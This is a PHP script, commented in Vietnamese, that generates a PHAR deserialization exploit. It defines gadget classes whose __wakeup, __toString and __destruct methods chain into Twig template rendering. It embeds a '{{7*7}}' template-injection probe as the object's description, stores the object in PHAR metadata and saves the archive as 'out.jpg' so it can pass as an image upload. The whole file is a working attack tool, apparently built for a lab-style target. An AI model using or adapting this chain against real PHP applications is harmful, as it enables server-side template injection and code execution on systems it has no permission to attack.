<?php

class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }

    public function __toString() {
        // tránh crash local
        if ($this->twig === null) {
            return "twig_not_initialized";
        }
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }

    public function __sleep() {
        return ["user", "desc"];
    }
}

class CustomTemplate {
    public $template_file_path; // ⚠️ để PUBLIC cho đơn giản hóa exploit

    public function __construct($path) {
        $this->template_file_path = $path;
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }

    public function __destruct() {
        @unlink($this->lockFilePath());
    }
}

/* =========================
   BUILD PAYLOAD OBJECT
========================= */

$blog = new Blog("user", "{{7*7}}");
$payload = new CustomTemplate($blog);

/* =========================
   PHAR BUILD
========================= */

@unlink("temp.phar");
@unlink("out.jpg");

$phar = new Phar("temp.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($payload);
$phar->stopBuffering();

/* =========================
   OUTPUT JPG (simple polyglot wrapper)
========================= */

file_put_contents("out.jpg", file_get_contents("temp.phar"));

echo "DONE\n";